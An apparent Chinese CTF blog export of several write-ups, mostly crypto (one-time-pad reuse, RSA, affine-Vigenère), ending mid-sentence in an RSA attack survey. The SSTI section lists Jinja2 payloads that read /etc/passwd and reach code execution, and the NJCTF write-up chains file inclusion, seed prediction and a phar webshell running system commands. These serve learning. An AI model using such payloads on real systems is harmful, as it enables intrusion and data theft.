    <content type="text"><![CDATA[简介 This time Fady learned from his old mistake and decided to use onetime pad as his encryption technique, but he never knew why people call it one time pad!msg 解题思路这是一个OTP加密的问题。在题目中给了十几个用同一一次密码本加密的内容，所以我们可以使用many time pad attack (aka crib drag)进行攻击。 具体过程1.参考这篇WP,用cribdrag进行猜测 123456789$ python xorstrings.py 0529242a631234122d2b36697f13272c207f2021283a6b0c7908 2f28202a302029142c653f3c7f2a2636273e3f2d653e252179082a01040053321d06014e09550039011a07411f0c4d044e2d0000$ python cribdrag.py 2a01040053321d06014e09550039011a07411f0c4d044e2d0000Your message is currently:0 __________________________Your key is currently:0 __________________________Please enter your crib: 在进行了一系列猜测后得到： 12345Your message is currently:0 Dear Friend, This time I uYour key is currently:0 nderstood my mistake and uPlease enter your crib: 最后通过xorstrings.py稍加修改进行解密 123456s1 = &quot;0529242a631234122d2b36697f13272c207f2021283a6b0c7908&quot;.decode(&apos;hex&apos;)s2 = &quot;Dear Friend, This time I u&quot;s3 = sxor(s1, s2)print s3 得到flag：ALEXCTF {HERE_GOES_THE_KEY} 2.使用脚本进行猜测 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#!/usr/bin/python## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017# @author intrd - http://dann.com.br/ # Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)import stringimport collectionsimport sets, sys# 11 unknown ciphertexts (in hex format), all encrpyted with the same keyc1 = "0529242a631234122d2b36697f13272c207f2021283a6b0c7908"c2 = "2f28202a302029142c653f3c7f2a2636273e3f2d653e25217908"c3 = "322921780c3a235b3c2c3f207f372e21733a3a2b37263b313012"c4 = "2f6c363b2b312b1e64651b6537222e37377f2020242b6b2c2d5d"c5 = "283f652c2b31661426292b653a292c372a2f20212a316b283c09"c6 = "29232178373c270f682c216532263b2d3632353c2c3c2a293504"c7 = "613c37373531285b3c2a72273a67212a277f373a243c20203d5d"c8 = "243a202a633d205b3c2d3765342236653a2c7423202f3f652a18"c9 = "2239373d6f740a1e3c651f207f2c212a247f3d2e65262430791c"c10 = "263e203d63232f0f20653f207f332065262c3168313722367918"c11 = "2f2f372133202f142665212637222220733e383f2426386b"ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]# The target ciphertext we want to cracktarget_cipher = "2239373d6f740a1e3c651f207f2c212a247f3d2e65262430791c"# XORs two stringdef strxor(a, b): # xor two strings (trims the longer input) return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])# To store the final keyfinal_key = [None]*150# To store the positions we know are brokenknown_key_positions = set()# For each ciphertextfor current_index, ciphertext in enumerate(ciphers): counter = collections.Counter() # for each other ciphertext for index, ciphertext2 in enumerate(ciphers): if current_index != index: # don't xor a ciphertext with itself for indexOfChar, char in enumerate(strxor(ciphertext.decode('hex'), ciphertext2.decode('hex'))): # Xor the two ciphertexts # If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don't know which one) if char in string.printable and char.isalpha(): counter[indexOfChar] += 1 # Increment the counter at this index knownSpaceIndexes = [] # Loop through all positions where a space character was possible in the current_index cipher for ind, val in counter.items(): # If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher! if val &gt;= 7: knownSpaceIndexes.append(ind) #print knownSpaceIndexes # Shows all the positions where we now know the key! # Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back! xor_with_spaces = strxor(ciphertext.decode('hex'),' '*150) for index in knownSpaceIndexes: # Store the key's value at the correct position final_key[index] = xor_with_spaces[index].encode('hex') # Record that we known the key at this position known_key_positions.add(index)# Construct a hex key from the currently known key, adding in '00' hex chars where we do not know (to make a complete hex string)final_key_hex = ''.join([val if val is not None else '00' for val in final_key])# Xor the currently known key with the target cipheroutput = strxor(target_cipher.decode('hex'),final_key_hex.decode('hex'))print "Fix this sentence:"print ''.join([char if index in known_key_positions else '*' for index, char in enumerate(output)])+"\n"# WAIT.. MANUAL STEP HERE # This output are printing a * if that character is not known yet# fix the missing characters like this: "Let*M**k*ow if *o&#123;*a" = "cure, Let Me know if you a"# if is too hard, change the target_cipher to another one and try again# and we have our key to fix the entire text!#sys.exit(0) #comment and continue if u got a good keytarget_plaintext = "cure, Let Me know if you a"print "Fixed:"print target_plaintext+"\n"key = strxor(target_cipher.decode('hex'),target_plaintext)print "Decrypted msg:"for cipher in ciphers: print strxor(cipher.decode('hex'),key)print "\nPrivate key recovered: "+key+"\n" 总结一次密码本如果使用不当还是会有不安全的部分，除此之外还可以使用中间人攻击等方法进行攻击。]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>Write up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RCTF-2015 Decode The File]]></title>
    <url>%2F2019%2F01%2F19%2FRCTF-2015-Decode-The-File%2F</url>
    <content type="text"><![CDATA[简介这道题是2015-RCTF的一道密码题，考点有点秀，就记下来了。 题目描述题目给了个cip文件,里面是一行一行的base64加密过的代码，逐行解码之后会得到一个DES加密的python代码。当时我看了很久都没弄懂解码出来的代码有啥用，后来去看了别人的wp才发现还有这种操作。具体就是每行base64加密过的代码解码之后再加密会发现末尾的字母会有变化，而经我测试下来也是如此 1 其中第一行是原本的明文，第二行是加密之后的base64密文，第三行我将末尾的w改成了y，第四行可以发现我们任然可以解码出原本的明文 而这道题的末尾都经过了这种隐写，最后通过脚本可以直接接出来 123456789101112131415161718192021222324252627282930def get_base64_diff_value(s1, s2): base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' res = 0 for i in xrange(len(s1)): if s1[i] != s2[i]: return abs(base64chars.index(s1[i]) - base64chars.index(s2[i])) return resdef solve_stego(): with open('cip', 'rb') as f: file_lines = f.readlines() bin_str = '' for line in file_lines: steg_line = line.replace('\n', '') norm_line = line.replace('\n', '').decode('base64').encode('base64').replace('\n', '') diff = get_base64_diff_value(steg_line, norm_line) pads_num = steg_line.count('=') if diff: bin_str += bin(diff)[2:].zfill(pads_num * 2) else: bin_str += '0' * pads_num * 2 res_str = '' for i in xrange(0, len(bin_str), 8): res_str += chr(int(bin_str[i:i+8], 2)) print res_strsolve_stego() 总结与其说是crypto不如说是stega，太秀了，而且这种隐写方式也出现在国际赛事上许多次，所以还是记录下来好好学习学习。]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>Write up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSTI的一些基本操作]]></title>
    <url>%2F2019%2F01%2F17%2FSSTI%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[简介记录一下SSTI的一些基本操作，方便以后使用。主要内容转载自该博客 任意文件读取POC123file类能够实例化文件对象，而且如果我们实例化了一个文件对象，那么我们就可用使用类似于read的方法来读取相关内容。找到file类的索引，在我的环境中&lt;type 'file'&gt;类的索引是40，我们就注入&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() &#125;&#125;可以通过以下语句绕过一些过滤&#123;&#123;''[request.args.a][request.args.b][2][request.args.c]()[40]('/etc/passwd')[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read 第一种代码执行POC1234file类不仅去读文件，而且也可以向目标服务器的可写入路径中写文件，然后我们再通过SSTI漏洞第二种代码执行poc调用from_pyfile方法去compile文件并执行其中的内容。这就是一个二次进攻。将&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('&lt;malicious code here&gt;') &#125;&#125;注入到SSTI漏洞点，然后在通过注入&#123;&#123; config.from_pyfile('/tmp/owned.cfg') &#125;&#125;调用编译过程。该代码在编译时将会被执行。这就实现了远程代码执行。 第二种代码执行POC：充分地利用from_pyfile方法。123将&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') &#125;&#125;注入到SSTI漏洞点，注入&#123;&#123; config.from_pyfile('/tmp/owned.cfg') &#125;&#125;来将新的项目添加到config对象中，将&#123;&#123; config['RUNCMD']('/usr/bin/id',shell=True) &#125;&#125;注入到SSTI漏洞点。]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017 NJCTF-Guess]]></title>
    <url>%2F2019%2F01%2F16%2F2017-NJCTF-Guess%2F</url>
    <content type="text"><![CDATA[简介这是一道2017年NJCTF的250分的Web题，刚好在XCTF的题库里刷到了，便记录下来。 解题思路首先打开题目，看见是一个上传页面，只允许上传gif|jpg|jpeg|png，在上传了一张png图片后提示成功 1 但并没有什么有用信息，我便扫了一下目录，也没有什么有用的地方。之后查看url，发现是http://111.198.29.45:30139/?page=upload,是一个文件包含漏洞，我便构造http://111.198.29.45:30139/?page=php://filter/read=convert.base64-encode/resource=upload读取upload.php的源代码，顺便也把index.php的源代码读了下来 index.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Upload&lt;/title&gt; &lt;link rel="stylesheet" href="http://fortawesome.github.io/Font-Awesome/assets/font-awesome/css/font-awesome.css"&gt; &lt;link rel="stylesheet" href="CSS/upload.css"&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="msg info" id="message"&gt; &lt;i class="fa fa-info-circle"&gt;&lt;/i&gt;please upload an IMAGE file (gif|jpg|jpeg|png)&lt;/div&gt;&lt;div class="container"&gt; &lt;form action="?page=upload" method="post" enctype="multipart/form-data" class="form"&gt; &lt;div class="file-upload-wrapper" id="file" data-text="Select an image!"&gt; &lt;label for="file-upload"&gt; &lt;input name="file-upload-field" type="file" class="file-upload-field" value="" id="file-upload"&gt;&lt;/label&gt; &lt;/div&gt; &lt;div class="div"&gt; &lt;input class="button" type="submit" value="Upload Image" name="submit"&gt; &lt;/div&gt; &lt;/form&gt; &lt;script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'&gt;&lt;/script&gt; &lt;script src="js/filename.js"&gt;&lt;/script&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phperror_reporting(0);session_start();if(isset($_GET['page']))&#123; $page=$_GET['page'];&#125;else&#123; $page=null;&#125;if(preg_match('/\.\./',$page))&#123; echo "&lt;div class=\"msg error\" id=\"message\"&gt; &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;Attack Detected!&lt;/div&gt;"; die();&#125;?&gt;&lt;?phpif($page)&#123; if(!(include($page.'.php'))) &#123; echo "&lt;div class=\"msg error\" id=\"message\"&gt; &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;error!&lt;/div&gt;"; exit; &#125;&#125;?&gt; upload.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;?phperror_reporting(0);function show_error_message($message)&#123; die("&lt;div class=\"msg error\" id=\"message\"&gt; &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;");&#125;function show_message($message)&#123; echo("&lt;div class=\"msg success\" id=\"message\"&gt; &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;");&#125;function random_str($length = "32")&#123; $set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F", "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L", "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R", "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X", "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9"); $str = ''; for ($i = 1; $i &lt;= $length; ++$i) &#123; $ch = mt_rand(0, count($set) - 1); $str .= $set[$ch]; &#125; return $str;&#125;session_start();$reg='/gif|jpg|jpeg|png/';if (isset($_POST['submit'])) &#123; $seed = rand(0,999999999); mt_srand($seed); $ss = mt_rand(); $hash = md5(session_id() . $ss); setcookie('SESSI0N', $hash, time() + 3600); if ($_FILES["file"]["error"] &gt; 0) &#123; show_error_message("Upload ERROR. Return Code: " . $_FILES["file-upload-field"]["error"]); &#125; $check2 = ((($_FILES["file-upload-field"]["type"] == "image/gif") || ($_FILES["file-upload-field"]["type"] == "image/jpeg") || ($_FILES["file-upload-field"]["type"] == "image/pjpeg") || ($_FILES["file-upload-field"]["type"] == "image/png")) &amp;&amp; ($_FILES["file-upload-field"]["size"] &lt; 204800)); $check3=!preg_match($reg,pathinfo($_FILES['file-upload-field']['name'], PATHINFO_EXTENSION)); if ($check3) show_error_message("Nope!"); if ($check2) &#123; $filename = './uP1O4Ds/' . random_str() . '_' . $_FILES['file-upload-field']['name']; if (move_uploaded_file($_FILES['file-upload-field']['tmp_name'], $filename)) &#123; show_message("Upload successfully. File type:" . $_FILES["file-upload-field"]["type"]); &#125; else show_error_message("Something wrong with the upload..."); &#125; else &#123; show_error_message("only allow gif/jpeg/png files smaller than 200kb!"); &#125;&#125;?&gt; 其中主要的部分还是upload.php。关键是上传路径部分。会用mt_rand()生成随机数并用random_str()方法生成随机上传路径。我们写入一句话到0.php中，然后压缩成0.zip并上传，将上传的cookie置0，服务器会返回一个cookie=5a7ef55999b2628d526fe7bf36eef6ec,cmd5网站解密得1188348307 2 3 得到的cookie的解密可以用于预测mt_rand的seed，可以使用php_mt_seed 4 之后编写php解密脚本解密随机路径，由于上一步我们预测得到了许多结果，一个一个试试就可以了 12345678910111213141516&lt;?php $set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F", "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L", "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R", "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X", "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9"); $seed=634631518; mt_srand($seed); $ss = mt_rand(); $str=""; for ($i = 1; $i &lt;= 32; ++$i) &#123; $ch = mt_rand(0, count($set) - 1); $str .= $set[$ch]; &#125; echo $str;?&gt; 得到随机路径QxhcViJacOp5AZFFM1sG2hj4htW8cF7N访问http://111.198.29.45:30139/uP1O4Ds/QxhcViJacOp5AZFFM1sG2hj4htW8cF7N_0.png可以发现预测成功 接下来构造http://111.198.29.45:30139/?page=phar://uP1O4Ds/QxhcViJacOp5AZFFM1sG2hj4htW8cF7N_0.png/0,post的参数为ver=system(&#39;ls&#39;);,发现flag-Edi98vJF8hnIp.txt 5 其中page=phar://uP1O4Ds/QxhcViJacOp5AZFFM1sG2hj4htW8cF7N_0.png/0会被index.php中的include($page.&#39;.php&#39;)解析为include(&#39;phar://uP1O4Ds/QxhcViJacOp5AZFFM1sG2hj4htW8cF7N_0.png/0.php&#39;),也就会触发我们写进去的一句话 最后post的参数设为ver=system(&#39;cat flag-Edi98vJF8hnIp.txt&#39;);便可得到flag 6 总结还是挺有趣的，就是XCTF平台提交flag一直显示不对，好迷]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Write up</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OpenSSL解RSA的基本操作]]></title>
    <url>%2F2019%2F01%2F16%2FOpenSSL%E8%A7%A3RSA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[简介本文主要是记录如何用OpenSSL解RSA的题目. 1.PCTF我选取了一道XCTF训练营中的入门题目,这是一道来自于PCTF的题目。同时也附上题目下载地址 解题步骤1.从pubkey.pem中提取n和e1openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem 结果如下: 1 n: C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDe: 65537 其中n转为10进制为87924348264132406875276140514499937145050893665602592992418171647042491658461 2.将n分解得到p和q利用yafu或factordb网站将n进行分解，得到 p: 319576316814478949870590164193048041239q: 275127860351348928173285174381581152299 3.用rsatool生成私钥文件:private.pem1python rsatool.py -o private.pem -e 65537 -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048041239 2 4.用private.pem解密flag.enc得到flag1openssl rsautl -decrypt -in flag.enc -inkey private.pem 3 2.AlexCTF-2017 Poor RSA1.从key.pub中读取公钥12345678$ openssl rsa -pubin -in key.pub -text -nooutPublic-Key: (399 bit)Modulus: 52:a9:9e:24:9e:e7:cf:3c:0c:bf:96:3a:00:96:61: 77:2b:c9:cd:f6:e1:e3:fb:fc:6e:44:a0:7a:5e:0f: 89:44:57:a9:f8:1c:3a:e1:32:ac:56:83:d3:5b:28: ba:5c:32:42:43Exponent: 65537 (0x10001) 2.将n分解得到p和qn比较小，可以用factordb.com网站分解p = 863653476616376575308866344984576466644942572246900013156919q = 965445304326998194798282228842484732438457170595999523426901 3.编写脚本构造priv.conf123456789101112131415161718192021222324252627import gmpy2p = 863653476616376575308866344984576466644942572246900013156919q = 965445304326998194798282228842484732438457170595999523426901e = 65537d = gmpy2.invert(e, (p - 1) * (q - 1))print '''asn1=SEQUENCE:rsa_key[rsa_key]version=INTEGER:0modulus=INTEGER:&#123;n&#125;pubExp=INTEGER:&#123;e&#125;privExp=INTEGER:&#123;e1&#125;p=INTEGER:&#123;p&#125;q=INTEGER:&#123;q&#125;e1=INTEGER:&#123;e1&#125;e2=INTEGER:&#123;e2&#125;coeff=INTEGER:&#123;coeff&#125;'''.format( n=p * q, e=e, p=p, q=q, e1=d % (p - 1), e2=d % (q - 1), coeff=gmpy2.invert(q, p),) 将打印出的结果写入priv.conf文件 1$ ./build.py &gt; priv.conf 4.用priv.conf导出priv.der1$ openssl asn1parse -genconf priv.conf -out priv.der -noout 5.解码得到flag12$ base64 -d flag.b64 | openssl rsautl -decrypt -inkey priv.der -keyform derALEXCTF&#123;SMALL_PRIMES_ARE_BAD&#125;]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>OpenSSL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XNUCA-baby_crypto]]></title>
    <url>%2F2019%2F01%2F12%2FXNUCA-baby-crypto%2F</url>
    <content type="text"><![CDATA[简介这道题是2018年XNUCA的一道密码题，当时由于自己比较菜没做出来，期末考试考完之后看书提到了重合指数破解Vigenere密码的内容，就想起来了这道题并开始复现一下。过程比较艰辛(自己太菜了),自闭了两三天终于弄出来了，也算是很开心，并于现在记录下来以备以后查看。 题目描述题目给的描述如下： The 26 letters a, b, c, …, y, z correspond to the integers 0, 1, 2, …, 25len(key_a) = mlen(key_k) = nc[i] = (p[i] * key_a[i % m] + key_k[i % n]) % 26 p is plain text, only lowercase letters are refered to.c is encrypted text I have appended the flag at the end of plain text, the format of which is like ‘flagis……’Now you have the encrypted text, Good luck! 并且题目给了encrypted_message，里面是大约1w多长度的密文，要求我们还原出来 基本概念重合指数法（index of coincidence，又称一致检索法）是Wolfe Friendman于1920年提出的方法。它可以进一步地检验多表代换密码的密钥长度。关于它的知识可以看这篇文章和这个问答 解题思路首先我们要确定的是m和n多久循环一次，这里可以使用拟重合指数法确定。如果是Vigenere密码则是确定密钥长度。 12345678910111213141516171819202122232425262728#使用拟重合指数法确定秘钥长度：拟重合指数大于0.6为标志def length(Ciphertext): ListCiphertext=list(Ciphertext) Keylength=1 while True: #指数初始化为０ CoincidenceIndex = 0 #使用切片分组 for i in range(Keylength): Numerator = 0 PresentCipherList = ListCiphertext[i::Keylength] #使用集合去重，计算每一子密文组的拟重合指数 for Letter in set(PresentCipherList): Numerator += PresentCipherList.count(Letter) * (PresentCipherList.count(Letter)-1) CoincidenceIndex += Numerator/(len(PresentCipherList) * (len(PresentCipherList)-1)) #求各子密文组的拟重合指数的平均值 Average=CoincidenceIndex / Keylength Keylength += 1 #均值＞0.6即可退出循环 if Average &gt; 0.06: break Keylength -= 1 return Keylength 确定的重合指数为6，则m和n的最小公因数就是6。之后我们可以将密文分为6组，分别统计每个字母的字频，以便接下来的分析 123456789101112131415#确定每个分组的字频def frequency(Ciphertext,keylength): ListCiphertext = list(Ciphertext) for i in range(keylength): # 使用切片分组 PresentCipherList = ListCiphertext[i::keylength] print("第",i+1,"组") #遍历移动的位数 for m in range(26): #从a到z的字母 Letter = chr(65+m) #统计字母频率 LetterFrequency = round(PresentCipherList.count(Letter)/ len(PresentCipherList),8) #输出结果 print("字母",Letter,"的频率是",LetterFrequency) 在字频中我们需要用到的有三个数据1.e的字频(大约在0.12左右)2.t的字频(大约在0.8左右)3.a的字频(大约在0.8左右)因为这三个字母的字频是最大且最容易区分(远大于其他字母)的，我们也就可以利用它们进行分析而在每个分组中我们都能找到和e,a,t三个字母相近频率的字母，我们可以将它们对应的位置保存下来以便接下来的使用。其中由于t和a的频率相近,所以我们会将它俩视作一起处理的数据 123e=[8,11,17,22,16,3] #e的位置aORt1=[7,3,13,4,8,10] #t或a的位置1aORt2=[10,12,24,21,17,25] #t或a的位置2 其中位置指的是在字母表中的位置(a为0)，如e数组中的第一个元素8就代表字母表中的i，也就是在第一个分组中加密算法将字母e加密为了字母i 接下来我们可以通过题目给的加密表达式推出p[i]和key_k的表达式$$p[i] = ((c[i]-key_k[i %n]) \times inv(key_a[i %m])) mod (26)$$$$key_k[i %n] = (c[i]-(p[i] \times key_a[i %m])) mod (26)$$ 其中inv(x)表示x的逆元 我们接下来要对key_a和key_k进行爆破。其中两个数组都分别有6项，每一项的取值范围都在(0,25)之间，如果直接爆破，时间复杂度是特别大的但是由于key_a数组需要求逆元，所以我们便可以对key_a的取值范围进行缩小来减小复杂度。最终我们确定下来key_a的取值在(1,3,5,7,9,11,15,17,19,21,23,25)之中之后我们通过上面的公式将key_k算出来(其中通过我们频率统计中统计出的e的位置确定c[i]的取值),并通过a和t的位置验证key_k的取值是否成立，如果成立则根据此时的key_a和key_k数组解密密文,我们便可以寻找有意义的答案，从而得到flag 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#通过字频进行爆破def brute(Ciphertext): #初始化key_a和key_ks key_a=[0,0,0,0,0,0] key_k=[0,0,0,0,0,0] #逆元数组 #inv = [1,9,21,15,3,19,7,23,11,5,17,25] inv = [0,0,0,0,0,0] #由于key_a需要求逆元，所以挑选出了可求逆元的数 a = [1,3,5,7,9,11,15,17,19,21,23,25] #爆破key_a数组 for a1 in a: for a2 in a: for a3 in a: for a4 in a: for a5 in a: for a6 in a: key_a[0]=a1 key_a[1]=a2 key_a[2]=a3 key_a[3]=a4 key_a[4]=a5 key_a[5]=a6 #算出每个位置上的key_k(根据e的频率) for i in range(6): key_k[i]=(e[i]-(4*key_a[i]))%26 flag = 0 #算出每个位置上的key_k(根据a和t的频率) for i in range(6): temp1 = (aORt1[i]-(19*key_a[i]))%26 temp2 = (aORt2[i]-(19*key_a[i]))%26 #判断算出的结果是否都满足e,a,t的频率分布，如果不满足则寻找下一个 if temp1!=key_k[i] and temp2!=key_k[i]: flag=1 break #寻找下一个 if flag==1: continue #求逆元 inv[0]=gmpy2.invert(a1,26) inv[1]=gmpy2.invert(a2,26) inv[2]=gmpy2.invert(a3,26) inv[3]=gmpy2.invert(a4,26) inv[4]=gmpy2.invert(a5,26) inv[5]=gmpy2.invert(a6,26) #计数，每6个位一循环进行解密 count=0 res="" for text in Ciphertext: t = ord(text)-65 r = ((t-key_k[count])*(inv[count]))%26 res+=chr(r+97) if count==5: count=0 else: count+=1 print("找到了可能的值！") print("key_a数组为:",key_a) print("key_k数组为:",key_k) print ("最后结果为：",res) 最终我们得到了flag flag 最终代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136# -*- coding: utf-8 -*-# !/usr/bin/env pythonimport gmpy2e=[8,11,17,22,16,3] #e的位置aORt1=[7,3,13,4,8,10] #t或a的位置1aORt2=[10,12,24,21,17,25] #t或a的位置2#使用拟重合指数法确定秘钥长度：拟重合指数大于0.6为标志def length(Ciphertext): ListCiphertext=list(Ciphertext) Keylength=1 while True: #指数初始化为０ CoincidenceIndex = 0 #使用切片分组 for i in range(Keylength): Numerator = 0 PresentCipherList = ListCiphertext[i::Keylength] #使用集合去重，计算每一子密文组的拟重合指数 for Letter in set(PresentCipherList): Numerator += PresentCipherList.count(Letter) * (PresentCipherList.count(Letter)-1) CoincidenceIndex += Numerator/(len(PresentCipherList) * (len(PresentCipherList)-1)) #求各子密文组的拟重合指数的平均值 Average=CoincidenceIndex / Keylength Keylength += 1 #均值＞0.6即可退出循环 if Average &gt; 0.06: break Keylength -= 1 return Keylength#确定每个分组的字频def frequency(Ciphertext,keylength): ListCiphertext = list(Ciphertext) for i in range(keylength): # 使用切片分组 PresentCipherList = ListCiphertext[i::keylength] print("第",i+1,"组") #遍历移动的位数 for m in range(26): #从a到z的字母 Letter = chr(65+m) #统计字母频率 LetterFrequency = round(PresentCipherList.count(Letter)/ len(PresentCipherList),8) #输出结果 print("字母",Letter,"的频率是",LetterFrequency)#通过字频进行爆破def brute(Ciphertext): #初始化key_a和key_ks key_a=[0,0,0,0,0,0] key_k=[0,0,0,0,0,0] #逆元数组 #inv = [1,9,21,15,3,19,7,23,11,5,17,25] inv = [0,0,0,0,0,0] #由于key_a需要求逆元，所以挑选出了可求逆元的数 a = [1,3,5,7,9,11,15,17,19,21,23,25] #爆破key_a数组 for a1 in a: for a2 in a: for a3 in a: for a4 in a: for a5 in a: for a6 in a: key_a[0]=a1 key_a[1]=a2 key_a[2]=a3 key_a[3]=a4 key_a[4]=a5 key_a[5]=a6 #算出每个位置上的key_k(根据e的频率) for i in range(6): key_k[i]=(e[i]-(4*key_a[i]))%26 flag = 0 #算出每个位置上的key_k(根据a和t的频率) for i in range(6): temp1 = (aORt1[i]-(19*key_a[i]))%26 temp2 = (aORt2[i]-(19*key_a[i]))%26 #判断算出的结果是否都满足e,a,t的频率分布，如果不满足则寻找下一个 if temp1!=key_k[i] and temp2!=key_k[i]: flag=1 break #寻找下一个 if flag==1: continue #求逆元 inv[0]=gmpy2.invert(a1,26) inv[1]=gmpy2.invert(a2,26) inv[2]=gmpy2.invert(a3,26) inv[3]=gmpy2.invert(a4,26) inv[4]=gmpy2.invert(a5,26) inv[5]=gmpy2.invert(a6,26) #计数，每6个位一循环进行解密 count=0 res="" for text in Ciphertext: t = ord(text)-65 r = ((t-key_k[count])*(inv[count]))%26 res+=chr(r+97) if count==5: count=0 else: count+=1 print("找到了可能的值！") print("key_a数组为:",key_a) print("key_k数组为:",key_k) print ("最后结果为：",res)if __name__ == '__main__': #这里输入的值不能完全读入，需要分两批读入并解密 Ciphertext = input("输入密文：").upper() Keylength = length(Ciphertext) print("密文的重合长度是",Keylength) #确定字频 frequency(Ciphertext,keylength) #爆破 brute(Ciphertext) 其中需要注意的是input的密文太长一次读不完，我们在找出key_a和key_k的解之后可以将密文分成两份分别解密 后记XNUCA的题目质量还是很高的，密码这边除了一道RSA公模攻击(签到题)之外还有一道有关量子密码通信的BB84协议题目，但是当我看到别人的write up并了解完BB84协议之后题目环境已经没了，对我来说还是比较可惜的。希望以后密码这边我能少自闭点，争取做出更多的题。]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>Write up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RSA攻击综述]]></title>
    <url>%2F2019%2F01%2F09%2FRSA%E6%94%BB%E5%87%BB%E7%BB%BC%E8%BF%B0%2F</url>
    <content type="text"><![CDATA[简介RSA作为密码学中的代表，就和web中的php一样，被许多人不断研究，才有着今天这样广泛的使用程度。当然与此相对的也有许多的攻击方式被不断挖掘出来。这篇文章主要是对现阶段主流的RSA攻击方式进行总结，并配上exp脚本，以备以后的使用。 基本解法首先介绍的是RSA通常解法，也就是已知p,q,e和ciphertext的时候求d和plaintext 脚本如下： 12345678910111213141516171819202122# -*- coding: utf-8 -*-import gmpy2print "素数p："p = input ()print "素数q："q = input ()n = p*qprint "公钥e："e = input ()print "密文ciphertext："ciphertext = input ()# d=invert(e,φ(n))，可见invert()函数解决 ed ≡ 1 (mod φ(n)) 问题d=gmpy2.invert(e,(p-1)*(q-1))print "私钥d：",dplaintext=pow(ciphertext, d, n)print "明文：",plaintext 对模数n的因子分解1.基本分解分解模数n是最直接的攻击方法，将n分解之后得到p,q，再通过p,q,e计算得到d，最后用d和n以及ciphertext求解plaintext分解模数n可以通过yafu或者factordb网站在线分解，之后使用常规解法求解即可 2.Pollard Rho rho算法其实是一种概率上的算法，虽然是靠概率，但是其准确率非常高（99.9%），更重要的是，该算法效率极高。其主要基于密码学当中的一个“生日悖论“来进行算法的设计。简单来讲就是，我们将N的两个因子x和y（就假设它有两个）从一大堆数里挑出来的概率非常小，但是如果我们挑满足x-y等于某个数的话，概率就要大很多。更进一步，如果我们找gcd(|x-y| 